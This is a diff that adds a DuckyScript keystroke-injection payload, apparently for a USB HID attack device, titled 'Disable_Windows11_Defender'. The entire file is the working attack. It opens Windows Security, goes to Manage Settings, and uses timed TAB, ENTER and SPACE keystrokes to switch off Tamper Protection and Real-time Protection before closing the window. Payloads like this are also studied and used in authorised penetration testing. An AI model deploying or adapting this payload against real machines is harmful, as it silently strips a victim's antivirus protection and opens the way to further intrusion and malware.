@@ -1,0 +1,40 @@
+REM Title:         Disable_Windows11_Defender
+REM Description    Disable Windows Defender and Tamper protection on Windows 11
+REM Author:        x-Error404-x
+REM Version:       1.0
+REM Target:        Windows 11
+REM Attackmodes:   HID
+DELAY 1000
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 1000
+STRING windows security
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+REM Navigate to Manage Settings then turn off Tamper Protection && Realtime Protection
+DELAY 500
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+SPACE
+DELAY 1000
+TAB
+TAB
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+SPACE
+DELAY 300
+ALT F4
